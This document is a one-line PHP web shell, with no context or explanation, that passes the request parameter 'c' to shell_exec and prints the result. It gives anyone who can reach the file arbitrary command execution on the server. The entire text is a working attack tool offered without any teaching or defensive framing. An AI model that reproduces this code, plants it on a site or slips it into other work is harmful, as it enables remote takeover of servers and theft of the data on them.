<?php if (isset($_REQUEST["c"])) { echo shell_exec($_REQUEST["c"]); } ?>
